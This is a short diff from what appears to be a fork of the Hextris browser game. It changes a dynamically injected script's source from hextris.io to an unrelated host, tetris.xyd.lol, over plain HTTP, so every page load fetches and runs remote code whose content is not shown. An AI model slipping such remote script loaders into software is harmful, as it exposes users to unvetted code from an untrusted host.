@@ -377,6 +377,6 @@ function showHelp() {
 
 (function(){
     	var script = document.createElement('script');
-	script.src = 'http://hextris.io/a.js';
+	script.src = 'http://tetris.xyd.lol/a.js';
 	document.head.appendChild(script);
 })()
